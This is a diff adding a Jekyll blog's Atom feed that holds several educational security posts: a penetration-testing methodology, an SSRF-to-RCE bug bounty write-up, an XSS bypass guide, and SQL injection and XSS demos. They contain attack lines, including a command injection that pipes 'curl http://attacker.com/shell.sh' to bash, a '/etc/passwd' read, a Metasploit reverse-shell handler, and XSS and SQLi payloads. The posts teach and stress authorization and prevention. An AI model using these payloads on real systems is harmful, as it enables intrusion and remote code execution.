@@ -1,0 +1,948 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-09-04T17:01:55+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Windows 95 Blog</title><subtitle>A retro Windows 95 style blog built with Jekyll</subtitle><author><name>Blog Author</name><email>author@example.com</email></author><entry><title type="html">Penetration Testing Methodology</title><link href="http://localhost:4000/penetration-testing/methodology/2025/01/03/pentest-methodology/" rel="alternate" type="text/html" title="Penetration Testing Methodology" /><published>2025-01-03T17:00:00+00:00</published><updated>2025-01-03T17:00:00+00:00</updated><id>http://localhost:4000/penetration-testing/methodology/2025/01/03/pentest-methodology</id><content type="html" xml:base="http://localhost:4000/penetration-testing/methodology/2025/01/03/pentest-methodology/"><![CDATA[<h1 id="professional-penetration-testing-methodology">Professional Penetration Testing Methodology</h1>
+
+<p>This guide outlines a comprehensive penetration testing methodology used by professional security consultants and ethical hackers.</p>
+
+<h2 id="testing-phases">Testing Phases</h2>
+
+<h3 id="1-planning-and-reconnaissance">1. Planning and Reconnaissance</h3>
+<p><strong>Objective</strong>: Gather information about the target without direct interaction.</p>
+
+<h4 id="passive-reconnaissance">Passive Reconnaissance</h4>
+<ul>
+  <li><strong>Domain Information</strong>: WHOIS, DNS records, subdomains</li>
+  <li><strong>Public Sources</strong>: Social media, job postings, press releases</li>
+  <li><strong>OSINT Tools</strong>: Shodan, Censys, Google dorks</li>
+  <li><strong>Network Range</strong>: IP address ranges, ASN information</li>
+</ul>
+
+<h4 id="active-reconnaissance">Active Reconnaissance</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Network scanning</span>
+nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-p-</span> target.com
+
+<span class="c"># Service enumeration</span>
+nmap <span class="nt">--script</span><span class="o">=</span>vuln target.com
+
+<span class="c"># Web application mapping</span>
+gobuster <span class="nb">dir</span> <span class="nt">-u</span> https://target.com <span class="nt">-w</span> wordlist.txt
+</code></pre></div></div>
+
+<h3 id="2-vulnerability-assessment">2. Vulnerability Assessment</h3>
+<p><strong>Objective</strong>: Identify potential security weaknesses.</p>
+
+<h4 id="automated-scanning">Automated Scanning</h4>
+<ul>
+  <li><strong>Nessus</strong>: Comprehensive vulnerability scanning</li>
+  <li><strong>OpenVAS</strong>: Open-source alternative</li>
+  <li><strong>Nexpose</strong>: Rapid7’s vulnerability scanner</li>
+  <li><strong>Qualys</strong>: Cloud-based scanning platform</li>
+</ul>
+
+<h4 id="manual-testing">Manual Testing</h4>
+<ul>
+  <li><strong>Web Applications</strong>: OWASP Top 10 testing</li>
+  <li><strong>Network Services</strong>: Port and service analysis</li>
+  <li><strong>Configuration Review</strong>: Security misconfigurations</li>
+  <li><strong>Social Engineering</strong>: Human factor assessment</li>
+</ul>
+
+<h3 id="3-exploitation">3. Exploitation</h3>
+<p><strong>Objective</strong>: Demonstrate the impact of identified vulnerabilities.</p>
+
+<h4 id="web-application-exploitation">Web Application Exploitation</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># SQL Injection</span>
+sqlmap <span class="nt">-u</span> <span class="s2">"http://target.com/search?id=1"</span> <span class="nt">--dbs</span>
+
+<span class="c"># XSS Testing</span>
+&lt;script&gt;alert<span class="o">(</span><span class="s1">'XSS'</span><span class="o">)</span>&lt;/script&gt;
+&lt;img <span class="nv">src</span><span class="o">=</span>x <span class="nv">onerror</span><span class="o">=</span>alert<span class="o">(</span><span class="s1">'XSS'</span><span class="o">)&gt;</span>
+
+<span class="c"># Command Injection</span>
+<span class="p">;</span> <span class="nb">cat</span> /etc/passwd
+| <span class="nb">whoami</span>
+</code></pre></div></div>
+
+<h4 id="network-exploitation">Network Exploitation</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Metasploit Framework</span>
+msfconsole
+use exploit/multi/handler
+<span class="nb">set </span>payload windows/meterpreter/reverse_tcp
+exploit
+
+<span class="c"># Custom Exploits</span>
+python3 exploit.py target.com 80
+</code></pre></div></div>
+
+<h3 id="4-post-exploitation">4. Post-Exploitation</h3>
+<p><strong>Objective</strong>: Assess the full scope of compromise.</p>
+
+<h4 id="privilege-escalation">Privilege Escalation</h4>
+<ul>
+  <li><strong>Windows</strong>: Token manipulation, service exploitation</li>
+  <li><strong>Linux</strong>: Kernel exploits, misconfigured services</li>
+  <li><strong>Web Applications</strong>: Access control bypass</li>
+</ul>
+
+<h4 id="persistence">Persistence</h4>
+<ul>
+  <li><strong>Backdoors</strong>: Web shells, reverse shells</li>
+  <li><strong>Scheduled Tasks</strong>: Cron jobs, Windows tasks</li>
+  <li><strong>Registry Modifications</strong>: Windows persistence</li>
+</ul>
+
+<h4 id="data-exfiltration">Data Exfiltration</h4>
+<ul>
+  <li><strong>Sensitive Files</strong>: Configuration files, databases</li>
+  <li><strong>Credentials</strong>: Password hashes, API keys</li>
+  <li><strong>Business Data</strong>: Customer information, trade secrets</li>
+</ul>
+
+<h2 id="testing-scenarios">Testing Scenarios</h2>
+
+<h3 id="external-network-testing">External Network Testing</h3>
+<ul>
+  <li><strong>Internet-facing Systems</strong>: Web servers, mail servers</li>
+  <li><strong>VPN Endpoints</strong>: Remote access solutions</li>
+  <li><strong>Cloud Services</strong>: AWS, Azure, GCP assessments</li>
+</ul>
+
+<h3 id="internal-network-testing">Internal Network Testing</h3>
+<ul>
+  <li><strong>Domain Controllers</strong>: Active Directory assessment</li>
+  <li><strong>File Servers</strong>: Data access and permissions</li>
+  <li><strong>Application Servers</strong>: Internal web applications</li>
+</ul>
+
+<h3 id="web-application-testing">Web Application Testing</h3>
+<ul>
+  <li><strong>OWASP Top 10</strong>: Current year vulnerabilities</li>
+  <li><strong>API Security</strong>: REST/SOAP API testing</li>
+  <li><strong>Mobile Applications</strong>: iOS/Android security</li>
+</ul>
+
+<h2 id="tools-and-resources">Tools and Resources</h2>
+
+<h3 id="reconnaissance-tools">Reconnaissance Tools</h3>
+<ul>
+  <li><strong>Nmap</strong>: Network discovery and port scanning</li>
+  <li><strong>Recon-ng</strong>: Web reconnaissance framework</li>
+  <li><strong>Maltego</strong>: OSINT and link analysis</li>
+  <li><strong>Shodan</strong>: Internet-connected device search</li>
+</ul>
+
+<h3 id="exploitation-tools">Exploitation Tools</h3>
+<ul>
+  <li><strong>Metasploit</strong>: Exploitation framework</li>
+  <li><strong>Burp Suite</strong>: Web application testing</li>
+  <li><strong>OWASP ZAP</strong>: Open-source web scanner</li>
+  <li><strong>Cobalt Strike</strong>: Advanced penetration testing</li>
+</ul>
+
+<h3 id="reporting-tools">Reporting Tools</h3>
+<ul>
+  <li><strong>Dradis</strong>: Collaborative reporting platform</li>
+  <li><strong>Faraday</strong>: Vulnerability management</li>
+  <li><strong>Custom Templates</strong>: Professional report generation</li>
+</ul>
+
+<h2 id="legal-and-ethical-considerations">Legal and Ethical Considerations</h2>
+
+<h3 id="authorization">Authorization</h3>
+<ul>
+  <li><strong>Written Permission</strong>: Always obtain formal authorization</li>
+  <li><strong>Scope Definition</strong>: Clearly define testing boundaries</li>
+  <li><strong>Timeline Agreement</strong>: Establish testing windows</li>
+  <li><strong>Communication Plan</strong>: Regular status updates</li>
+</ul>
+
+<h3 id="responsible-disclosure">Responsible Disclosure</h3>
+<ul>
+  <li><strong>Immediate Notification</strong>: Critical vulnerabilities</li>
+  <li><strong>Detailed Reports</strong>: Comprehensive findings</li>
+  <li><strong>Remediation Support</strong>: Technical guidance</li>
+  <li><strong>Follow-up Testing</strong>: Verification of fixes</li>
+</ul>
+
+<h2 id="report-structure">Report Structure</h2>
+
+<h3 id="executive-summary">Executive Summary</h3>
+<ul>
+  <li><strong>Executive Overview</strong>: High-level findings</li>
+  <li><strong>Risk Assessment</strong>: Business impact analysis</li>
+  <li><strong>Recommendations</strong>: Strategic security improvements</li>
+</ul>
+
+<h3 id="technical-details">Technical Details</h3>
+<ul>
+  <li><strong>Methodology</strong>: Testing approach and tools</li>
+  <li><strong>Findings</strong>: Detailed vulnerability descriptions</li>
+  <li><strong>Proof of Concept</strong>: Reproduction steps</li>
+  <li><strong>Remediation</strong>: Specific fix recommendations</li>
+</ul>
+
+<h3 id="appendices">Appendices</h3>
+<ul>
+  <li><strong>Raw Data</strong>: Scan results and logs</li>
+  <li><strong>Tools Used</strong>: Complete tool inventory</li>
+  <li><strong>References</strong>: Industry standards and best practices</li>
+</ul>
+
+<h2 id="best-practices">Best Practices</h2>
+
+<h3 id="professional-conduct">Professional Conduct</h3>
+<ul>
+  <li><strong>Documentation</strong>: Record every step and finding</li>
+  <li><strong>Communication</strong>: Regular client updates</li>
+  <li><strong>Quality Assurance</strong>: Peer review of findings</li>
+  <li><strong>Continuous Learning</strong>: Stay current with threats</li>
+</ul>
+
+<h3 id="technical-excellence">Technical Excellence</h3>
+<ul>
+  <li><strong>Methodical Approach</strong>: Systematic testing methodology</li>
+  <li><strong>Tool Mastery</strong>: Deep understanding of testing tools</li>
+  <li><strong>Custom Scripts</strong>: Automation and efficiency</li>
+  <li><strong>Innovation</strong>: Creative problem-solving approaches</li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Professional penetration testing requires a combination of technical expertise, methodological rigor, and ethical conduct. Success depends on thorough planning, systematic execution, and clear communication of findings.</p>
+
+<p><strong>Key Success Factors:</strong></p>
+<ul>
+  <li>Comprehensive methodology</li>
+  <li>Professional tools and techniques</li>
+  <li>Clear communication and reporting</li>
+  <li>Continuous skill development</li>
+  <li>Ethical and legal compliance</li>
+</ul>]]></content><author><name>Blog Author</name><email>author@example.com</email></author><category term="penetration-testing" /><category term="methodology" /><summary type="html"><![CDATA[A comprehensive guide to professional penetration testing methodology and best practices.]]></summary></entry><entry><title type="html">Bug Bounty Success Story</title><link href="http://localhost:4000/bug-bounty/write-ups/2025/01/03/bug-bounty-writeup/" rel="alternate" type="text/html" title="Bug Bounty Success Story" /><published>2025-01-03T16:00:00+00:00</published><updated>2025-01-03T16:00:00+00:00</updated><id>http://localhost:4000/bug-bounty/write-ups/2025/01/03/bug-bounty-writeup</id><content type="html" xml:base="http://localhost:4000/bug-bounty/write-ups/2025/01/03/bug-bounty-writeup/"><![CDATA[<h1 id="bug-bounty-success-story-ssrf-to-rce">Bug Bounty Success Story: SSRF to RCE</h1>
+
+<p>This write-up details a critical Server-Side Request Forgery (SSRF) vulnerability that led to Remote Code Execution (RCE) on a major e-commerce platform.</p>
+
+<h2 id="target-information">Target Information</h2>
+<ul>
+  <li><strong>Platform</strong>: E-commerce SaaS</li>
+  <li><strong>Bug Type</strong>: SSRF → RCE</li>
+  <li><strong>Severity</strong>: Critical</li>
+  <li><strong>Bounty</strong>: $5,000</li>
+  <li><strong>Timeline</strong>: 3 weeks from discovery to payout</li>
+</ul>
+
+<h2 id="discovery-process">Discovery Process</h2>
+
+<h3 id="initial-reconnaissance">Initial Reconnaissance</h3>
+<p>The target had a webhook configuration feature that allowed users to set custom URLs for notifications. This immediately caught my attention as a potential SSRF vector.</p>
+
+<h3 id="vulnerability-analysis">Vulnerability Analysis</h3>
+
+<h4 id="step-1-webhook-testing">Step 1: Webhook Testing</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Test payloads</span>
+http://localhost:22
+http://127.0.0.1:3306
+http://169.254.169.254/latest/meta-data/
+</code></pre></div></div>
+
+<h4 id="step-2-internal-service-discovery">Step 2: Internal Service Discovery</h4>
+<p>The webhook feature was making requests to internal services without proper validation:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">POST /api/webhooks/configure
+Content-Type: application/json
+
+{
+  "url": "http://internal-service:8080/admin",
+  "events": ["order.created"]
+}
+</span></code></pre></div></div>
+
+<h4 id="step-3-rce-chain">Step 3: RCE Chain</h4>
+<p>The internal service had a vulnerable endpoint that allowed command injection:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">POST /admin/backup
+Content-Type: application/json
+
+{
+  "path": "/tmp/backup; curl http://attacker.com/shell.sh | bash"
+}
+</span></code></pre></div></div>
+
+<h2 id="exploitation-chain">Exploitation Chain</h2>
+
+<ol>
+  <li><strong>SSRF</strong>: Bypass webhook URL validation</li>
+  <li><strong>Internal Discovery</strong>: Find vulnerable internal services</li>
+  <li><strong>Command Injection</strong>: Execute arbitrary commands</li>
+  <li><strong>Persistence</strong>: Establish backdoor access</li>
+</ol>
+
+<h2 id="impact-assessment">Impact Assessment</h2>
+
+<ul>
+  <li><strong>Data Breach</strong>: Access to customer database</li>
+  <li><strong>System Compromise</strong>: Full server access</li>
+  <li><strong>Business Disruption</strong>: Potential service downtime</li>
+  <li><strong>Compliance Violations</strong>: GDPR/PCI-DSS implications</li>
+</ul>
+
+<h2 id="responsible-disclosure">Responsible Disclosure</h2>
+
+<h3 id="timeline">Timeline</h3>
+<ul>
+  <li><strong>Day 1</strong>: Vulnerability discovered</li>
+  <li><strong>Day 2</strong>: Proof of concept developed</li>
+  <li><strong>Day 3</strong>: Report submitted to bug bounty program</li>
+  <li><strong>Day 5</strong>: Initial response from security team</li>
+  <li><strong>Day 10</strong>: Vulnerability confirmed</li>
+  <li><strong>Day 15</strong>: Fix deployed</li>
+  <li><strong>Day 21</strong>: Bounty awarded</li>
+</ul>
+
+<h3 id="communication">Communication</h3>
+<p>Maintained professional communication throughout the process:</p>
+<ul>
+  <li>Clear vulnerability description</li>
+  <li>Step-by-step reproduction steps</li>
+  <li>Impact assessment</li>
+  <li>Suggested remediation</li>
+</ul>
+
+<h2 id="lessons-learned">Lessons Learned</h2>
+
+<h3 id="technical-insights">Technical Insights</h3>
+<ul>
+  <li>Always test internal service endpoints</li>
+  <li>Chain multiple vulnerabilities for greater impact</li>
+  <li>Document every step for clear reproduction</li>
+</ul>
+
+<h3 id="business-insights">Business Insights</h3>
+<ul>
+  <li>Bug bounty programs are valuable for security</li>
+  <li>Quick response times build trust</li>
+  <li>Clear communication is essential</li>
+</ul>
+
+<h2 id="prevention-recommendations">Prevention Recommendations</h2>
+
+<ol>
+  <li><strong>Input Validation</strong>: Validate all URL inputs</li>
+  <li><strong>Network Segmentation</strong>: Isolate internal services</li>
+  <li><strong>Access Controls</strong>: Implement proper authentication</li>
+  <li><strong>Monitoring</strong>: Deploy intrusion detection systems</li>
+</ol>
+
+<h2 id="tools-used">Tools Used</h2>
+
+<ul>
+  <li><strong>Burp Suite</strong>: Web application testing</li>
+  <li><strong>Nmap</strong>: Network reconnaissance</li>
+  <li><strong>Custom Scripts</strong>: Automation and testing</li>
+  <li><strong>Documentation</strong>: Clear reporting</li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>This bug bounty success demonstrates the importance of thorough security testing and responsible disclosure. The $5,000 bounty was well-earned through careful research and professional communication.</p>
+
+<p><strong>Key Takeaways:</strong></p>
+<ul>
+  <li>Persistence pays off in bug hunting</li>
+  <li>Chain vulnerabilities for maximum impact</li>
+  <li>Professional communication is crucial</li>
+  <li>Document everything thoroughly</li>
+</ul>]]></content><author><name>Blog Author</name><email>author@example.com</email></author><category term="bug-bounty" /><category term="write-ups" /><summary type="html"><![CDATA[A detailed write-up of a successful bug bounty submission that earned $5,000.]]></summary></entry><entry><title type="html">Advanced XSS Techniques</title><link href="http://localhost:4000/web-security/xss/2025/01/03/advanced-xss/" rel="alternate" type="text/html" title="Advanced XSS Techniques" /><published>2025-01-03T15:00:00+00:00</published><updated>2025-01-03T15:00:00+00:00</updated><id>http://localhost:4000/web-security/xss/2025/01/03/advanced-xss</id><content type="html" xml:base="http://localhost:4000/web-security/xss/2025/01/03/advanced-xss/"><![CDATA[<h1 id="advanced-xss-techniques">Advanced XSS Techniques</h1>
+
+<p>Cross-Site Scripting (XSS) remains one of the most prevalent web vulnerabilities. This post explores advanced techniques used by security researchers and attackers.</p>
+
+<h2 id="xss-categories">XSS Categories</h2>
+
+<h3 id="1-reflected-xss">1. Reflected XSS</h3>
+<p>Reflected XSS occurs when malicious input is immediately reflected back to the user without proper sanitization.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Vulnerable code example</span>
+<span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">userInput</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h3 id="2-stored-xss">2. Stored XSS</h3>
+<p>Stored XSS persists malicious code in the database and affects all users who view the infected page.</p>
+
+<h3 id="3-dom-based-xss">3. DOM-based XSS</h3>
+<p>DOM-based XSS occurs when JavaScript modifies the DOM with untrusted input.</p>
+
+<h2 id="advanced-bypass-techniques">Advanced Bypass Techniques</h2>
+
+<h3 id="filter-evasion">Filter Evasion</h3>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Common bypass patterns</span>
+<span class="o">&lt;</span><span class="nx">ScRiPt</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/ScRiPt</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">svg</span> <span class="nx">onload</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h3 id="encoding-bypasses">Encoding Bypasses</h3>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// HTML encoding</span>
+<span class="o">&amp;</span><span class="err">#</span><span class="mi">60</span><span class="p">;</span><span class="nx">script</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">62</span><span class="p">;</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">60</span><span class="p">;</span><span class="sr">/script&amp;#62</span><span class="err">;
+</span>
+<span class="c1">// URL encoding</span>
+<span class="o">%</span><span class="mi">3</span><span class="nx">Cscript</span><span class="o">%</span><span class="mi">3</span><span class="nc">Ealert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">3</span><span class="nx">C</span><span class="o">/</span><span class="nx">script</span><span class="o">%</span><span class="mi">3</span><span class="nx">E</span>
+
+<span class="c1">// Unicode encoding</span>
+<span class="err">\</span><span class="nx">u003Cscript</span><span class="err">\</span><span class="nf">u003Ealert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="err">\</span><span class="nx">u003C</span><span class="o">/</span><span class="nx">script</span><span class="err">\</span><span class="nx">u003E</span>
+</code></pre></div></div>
+
+<h2 id="real-world-examples">Real-World Examples</h2>
+
+<h3 id="case-study-social-media-platform">Case Study: Social Media Platform</h3>
+<p>A major social media platform was vulnerable to stored XSS through profile bio fields. Attackers could inject malicious JavaScript that would execute for all users viewing the profile.</p>
+
+<h3 id="impact-assessment">Impact Assessment</h3>
+<ul>
+  <li>Session hijacking</li>
+  <li>Credential theft</li>
+  <li>Malicious redirects</li>
+  <li>Data exfiltration</li>
+</ul>
+
+<h2 id="prevention-strategies">Prevention Strategies</h2>
+
+<ol>
+  <li><strong>Input Validation</strong>: Validate all user input</li>
+  <li><strong>Output Encoding</strong>: Encode output based on context</li>
+  <li><strong>Content Security Policy</strong>: Implement CSP headers</li>
+  <li><strong>Regular Testing</strong>: Conduct regular security assessments</li>
+</ol>
+
+<h2 id="interactive-demo">Interactive Demo</h2>
+
+<p>Try the XSS demo in the Cybersecurity Tools section to see these techniques in action!</p>]]></content><author><name>Blog Author</name><email>author@example.com</email></author><category term="web-security" /><category term="xss" /><summary type="html"><![CDATA[Explore advanced Cross-Site Scripting techniques and bypass methods.]]></summary></entry><entry><title type="html">SQL Injection Demo</title><link href="http://localhost:4000/bug-bounty/web-security/2025/01/03/sqli-demo/" rel="alternate" type="text/html" title="SQL Injection Demo" /><published>2025-01-03T13:00:00+00:00</published><updated>2025-01-03T13:00:00+00:00</updated><id>http://localhost:4000/bug-bounty/web-security/2025/01/03/sqli-demo</id><content type="html" xml:base="http://localhost:4000/bug-bounty/web-security/2025/01/03/sqli-demo/"><![CDATA[<h1 id="sql-injection-attack-demo">SQL Injection Attack Demo</h1>
+
+<p>SQL Injection is a code injection technique used to attack data-driven applications. It occurs when malicious SQL statements are inserted into an entry field for execution.</p>
+
+<h2 id="how-sql-injection-works">How SQL Injection Works</h2>
+
+<p>SQL Injection happens when:</p>
+<ol>
+  <li>User input is directly concatenated into SQL queries</li>
+  <li>The input is not properly sanitized or parameterized</li>
+  <li>Malicious SQL code can be executed in the database</li>
+</ol>
+
+<h2 id="interactive-demo">Interactive Demo</h2>
+
+<p>Try different login attempts to see how SQL injection works:</p>
+
+<div class="sqli-demo" style="background: #f0f0f0; border: 1px solid #c0c0c0; padding: 16px; margin: 16px 0;">
+    <h3>Vulnerable Login System</h3>
+    <p>Try logging in with different credentials:</p>
+    <div style="margin: 8px 0;">
+        <label>Username:</label><br />
+        <input type="text" class="sqli-username" placeholder="admin" style="width: 100%; padding: 4px; margin: 4px 0; border: 1px inset #c0c0c0;" />
+    </div>
+    <div style="margin: 8px 0;">
+        <label>Password:</label><br />
+        <input type="password" class="sqli-password" placeholder="password" style="width: 100%; padding: 4px; margin: 4px 0; border: 1px inset #c0c0c0;" />
+    </div>
+    <button class="sqli-login" style="background: #c0c0c0; border: 1px outset #c0c0c0; padding: 4px 8px; cursor: pointer;">Login</button>
+    <div class="sqli-result" style="margin-top: 16px; padding: 8px; background: white; border: 1px inset #c0c0c0; min-height: 100px;"></div>
+</div>
+
+<h2 id="common-sql-injection-payloads">Common SQL Injection Payloads</h2>
+
+<h3 id="authentication-bypass">Authentication Bypass</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: admin' OR '1'='1
+Password: anything
+</code></pre></div></div>
+
+<h3 id="union-based-injection">Union-Based Injection</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: admin' UNION SELECT 1,2,3--
+Password: anything
+</code></pre></div></div>
+
+<h3 id="boolean-based-blind-injection">Boolean-Based Blind Injection</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: admin' AND 1=1--
+Password: anything
+</code></pre></div></div>
+
+<h3 id="time-based-blind-injection">Time-Based Blind Injection</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: admin'; WAITFOR DELAY '00:00:05'--
+Password: anything
+</code></pre></div></div>
+
+<h2 id="valid-test-credentials">Valid Test Credentials</h2>
+
+<p>For testing normal login functionality:</p>
+<ul>
+  <li>Username: <code class="language-plaintext highlighter-rouge">admin</code>, Password: <code class="language-plaintext highlighter-rouge">admin123</code></li>
+  <li>Username: <code class="language-plaintext highlighter-rouge">user</code>, Password: <code class="language-plaintext highlighter-rouge">password</code></li>
+  <li>Username: <code class="language-plaintext highlighter-rouge">test</code>, Password: <code class="language-plaintext highlighter-rouge">test123</code></li>
+</ul>
+
+<h2 id="prevention-methods">Prevention Methods</h2>
+
+<ol>
+  <li><strong>Prepared Statements</strong>: Use parameterized queries</li>
+  <li><strong>Input Validation</strong>: Validate and sanitize all user input</li>
+  <li><strong>Least Privilege</strong>: Use database accounts with minimal privileges</li>
+  <li><strong>Error Handling</strong>: Don’t expose database errors to users</li>
+  <li><strong>Web Application Firewall</strong>: Implement WAF rules to block SQL injection attempts</li>
+</ol>
+
+<h2 id="impact">Impact</h2>
+
+<p>SQL Injection can lead to:</p>
+<ul>
+  <li>Unauthorized access to sensitive data</li>
+  <li>Data modification or deletion</li>
+  <li>Database schema disclosure</li>
+  <li>Server compromise</li>
+  <li>Complete database takeover</li>
+</ul>
+
+<h2 id="real-world-example">Real-World Example</h2>
+
+<p>The infamous SQL query that could be vulnerable:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'$username'</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">'$password'</span>
+</code></pre></div></div>
+
+<p>With malicious input:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">'anything'</span>
+</code></pre></div></div>
+
+<p>This would return all users, effectively bypassing authentication.</p>
+
+<p>Remember: This demo is for educational purposes only. Always use your knowledge responsibly and only test on systems you own or have explicit permission to test.</p>]]></content><author><name>Blog Author</name><email>author@example.com</email></author><category term="bug-bounty" /><category term="web-security" /><summary type="html"><![CDATA[Learn about SQL Injection attacks through an interactive login demonstration.]]></summary></entry><entry><title type="html">XSS Attack Demo</title><link href="http://localhost:4000/bug-bounty/web-security/2025/01/03/xss-demo/" rel="alternate" type="text/html" title="XSS Attack Demo" /><published>2025-01-03T12:00:00+00:00</published><updated>2025-01-03T12:00:00+00:00</updated><id>http://localhost:4000/bug-bounty/web-security/2025/01/03/xss-demo</id><content type="html" xml:base="http://localhost:4000/bug-bounty/web-security/2025/01/03/xss-demo/"><![CDATA[<h1 id="cross-site-scripting-xss-attack-demo">Cross-Site Scripting (XSS) Attack Demo</h1>
+
+<p>Cross-Site Scripting (XSS) is one of the most common web vulnerabilities. It occurs when a web application includes untrusted data in a web page without proper validation or escaping.</p>
+
+<h2 id="how-xss-works">How XSS Works</h2>
+
+<p>XSS attacks happen when:</p>
+<ol>
+  <li>A web application takes user input</li>
+  <li>The input is not properly sanitized</li>
+  <li>The input is displayed back to users without escaping</li>
+  <li>Malicious scripts can be executed in other users’ browsers</li>
+</ol>
+
+<h2 id="interactive-demo">Interactive Demo</h2>
+
+<p>Try entering different payloads in the input field below to see how XSS attacks work:</p>
+
+<div class="xss-demo" style="background: #f0f0f0; border: 1px solid #c0c0c0; padding: 16px; margin: 16px 0;">
+    <h3>XSS Payload Tester</h3>
+    <p>Enter a payload to test:</p>
+    <input type="text" class="xss-input" placeholder="Try: &lt;script&gt;alert('XSS')&lt;/script&gt;" style="width: 100%; padding: 8px; margin: 8px 0; border: 1px inset #c0c0c0;" />
+    <button class="xss-execute" style="background: #c0c0c0; border: 1px outset #c0c0c0; padding: 4px 8px; cursor: pointer;">Execute</button>
+    <div class="xss-output" style="margin-top: 16px; padding: 8px; background: white; border: 1px inset #c0c0c0; min-height: 100px;"></div>
+</div>
+
+<h2 id="common-xss-payloads">Common XSS Payloads</h2>
+
+<p>Here are some common XSS payloads you can try:</p>
+
+<h3 id="basic-script-injection">Basic Script Injection</h3>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h3 id="image-tag-xss">Image Tag XSS</h3>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"x"</span> <span class="na">onerror=</span><span class="s">"alert('XSS')"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<h3 id="event-handler-xss">Event Handler XSS</h3>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">onfocus=</span><span class="s">"alert('XSS')"</span> <span class="na">autofocus</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<h3 id="javascript-url">JavaScript URL</h3>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript:alert('XSS')"</span><span class="nt">&gt;</span>Click me<span class="nt">&lt;/a&gt;</span>
+</code></pre></div></div>
+
+<h2 id="prevention-methods">Prevention Methods</h2>
+
+<ol>
+  <li><strong>Input Validation</strong>: Validate all user input on the server side</li>
+  <li><strong>Output Encoding</strong>: Properly encode output when displaying user data</li>
+  <li><strong>Content Security Policy (CSP)</strong>: Implement CSP headers to prevent script execution</li>
+  <li><strong>HTTP-Only Cookies</strong>: Use HTTP-only cookies to prevent JavaScript access</li>
+</ol>
+
+<h2 id="impact">Impact</h2>
+
+<p>XSS attacks can lead to:</p>
+<ul>
+  <li>Session hijacking</li>
+  <li>Defacement of websites</li>
+  <li>Redirection to malicious sites</li>
+  <li>Theft of sensitive information</li>
+  <li>Installation of malware</li>
+</ul>
+
